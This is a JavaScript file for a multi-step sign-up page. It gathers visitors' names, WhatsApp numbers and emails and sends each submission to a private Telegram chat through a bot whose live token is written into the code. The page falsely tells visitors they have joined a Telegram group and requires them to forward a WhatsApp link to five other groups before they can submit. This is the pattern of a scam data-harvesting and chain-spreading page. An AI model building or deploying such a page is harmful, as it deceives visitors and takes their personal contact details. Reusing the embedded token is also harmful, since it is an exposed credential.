let currentStep = 1;
let nameEntered = false;
let groupJoined = false;

// Step 1: Ensure form inputs are filled
document.getElementById('name').addEventListener('input', validateForm);
document.getElementById('lastname').addEventListener('input', validateForm);
document.getElementById('whatsapp').addEventListener('input', validateForm);
document.getElementById('email').addEventListener('input', validateForm);

function validateForm() {
    const name = document.getElementById('name').value.trim();
    const lastname = document.getElementById('lastname').value.trim();
    const whatsapp = document.getElementById('whatsapp').value.trim();
    const email = document.getElementById('email').value.trim();

    const isWhatsAppValid = /^\d{10}$/.test(whatsapp);

    if (name && lastname && isWhatsAppValid && email) {
        nameEntered = true;
        document.getElementById('nextBtn1').disabled = false;
        document.getElementById('nextBtn1').style.backgroundColor = '#FFC107';  // Enable button color
    } else {
        nameEntered = false;
        document.getElementById('nextBtn1').disabled = true;
        document.getElementById('nextBtn1').style.backgroundColor = '#999';  // Disabled state color
    }
}

document.getElementById('nextBtn1').addEventListener('click', function() {
    if (nameEntered) {
        const name = document.getElementById('name').value.trim();
        const lastname = document.getElementById('lastname').value.trim();
        const whatsapp = document.getElementById('whatsapp').value.trim();
        const email = document.getElementById('email').value.trim();

        // Send user data to Telegram when Next button is clicked
        const botToken = '7509401611:AAGBMiFJjC3PS9YA17oj4KW5VUj0RlSW4Zw';  // Replace with your bot token
        const chatId = '5805194791';  // Replace with your chat ID

        const message = `*New User Submission:*\n*First Name:* ${name}\n*Last Name:* ${lastname}\n*WhatsApp:* ${whatsapp}\n*Email:* ${email}`;

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'Markdown'
            })
        })
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                animateSectionChange(2);
            } else {
                alert('Failed to send data to Telegram. Please try again.');
            }
        })
        .catch(error => {
            console.error('Error sending data:', error);
            alert('An error occurred. Please try again later.');
        });
    }
});

document.getElementById('joinGroup').addEventListener('click', function() {
    groupJoined = true;
    document.getElementById('nextBtn2').disabled = false;
    document.getElementById('nextBtn2').style.backgroundColor = '#FFC107';  // Enable button color
    alert('You’ve joined the Telegram group. Now, you can proceed.');
});

document.getElementById('nextBtn2').addEventListener('click', function() {
    if (groupJoined) {
        animateSectionChange(3);
    }
});

document.getElementById('shareGroup').addEventListener('click', function() {
    alert('Please share the WhatsApp group link with 5 other groups!');
    document.getElementById('submitBtn').disabled = false;
    document.getElementById('submitBtn').style.backgroundColor = '#007bff';  // Enable button color
});

// Form submission handling
document.getElementById('userForm').addEventListener('submit', function(event) {
    event.preventDefault();  // Prevent default form submission behavior

    const name = document.getElementById('name').value.trim();
    const lastname = document.getElementById('lastname').value.trim();
    const whatsapp = document.getElementById('whatsapp').value.trim();
    const email = document.getElementById('email').value.trim();

    if (!name || !lastname || !whatsapp || !email) {
        alert('Please fill in all fields before submitting.');
        return;
    }

    // Send final submission to Telegram
    const botToken = '7509401611:AAGBMiFJjC3PS9YA17oj4KW5VUj0RlSW4Zw';
    const chatId = '5805194791';

    const message = `*Final Submission:*\n*First Name:* ${name}\n*Last Name:* ${lastname}\n*WhatsApp:* ${whatsapp}\n*Email:* ${email}`;

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: 'Markdown'
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            window.location.href = 'thankyou.html';  // Redirect after successful submission
        } else {
            alert('Failed to send data to Telegram. Please try again.');
        }
    })
    .catch(error => {
        console.error('Error sending data:', error);
        alert('An error occurred. Please try again later.');
    });
});

function animateSectionChange(step) {
    const currentSection = document.getElementById('section' + currentStep);
    const nextSection = document.getElementById('section' + step);

    currentSection.style.opacity = '0';
    setTimeout(() => {
        currentSection.style.display = 'none';
        nextSection.style.display = 'block';
        nextSection.style.opacity = '0';
        setTimeout(() => {
            nextSection.style.opacity = '1';
        }, 10);
        updateProgressBar(step);
        currentStep = step;
    }, 500);
}

function updateProgressBar(step) {
    const progressPercentage = (step - 1) * 50;
    document.getElementById('progress').style.width = progressPercentage + '%';
}
